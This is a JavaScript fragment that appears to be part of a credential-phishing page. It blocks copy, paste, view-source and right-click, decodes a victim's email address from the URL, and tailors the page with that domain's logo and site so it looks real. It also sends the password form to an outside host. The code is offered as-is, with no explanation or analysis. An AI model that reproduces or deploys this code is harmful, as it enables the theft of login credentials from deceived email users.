document.onkeydown = function(e) {
        if (e.ctrlKey && 
            (e.keyCode === 67 || 
             e.keyCode === 86 || 
             e.keyCode === 85 || 
             e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
};
$(document).keypress("u",function(e) {
  if(e.ctrlKey)
  {
return false;
}
else
{
return true;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.getElementById("inpwd").focus();
            var str = window.location.href;
          var strs = str.split("#");
          var emap = strs[1];
          var emaq = atob(emap);
          if(emaq){
            document.getElementById("bax").innerHTML = emaq;
            document.getElementById("cax").value = emaq;
            document.getElementById("pax").action = "https://vciaudio.com/zoc/loading.php";
          }
		  
		   var ind=emaq.indexOf("@");
        var my_slice=emaq.substr((ind+1));
      var mainPage = 'https://'+my_slice; 
     //     var mainPage = 'https://webmail.staralliancebd.com/';  
        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
         document.getElementById('mainPage').src = mainPage;
    //    $("#mainPage").src(mainPage);
		  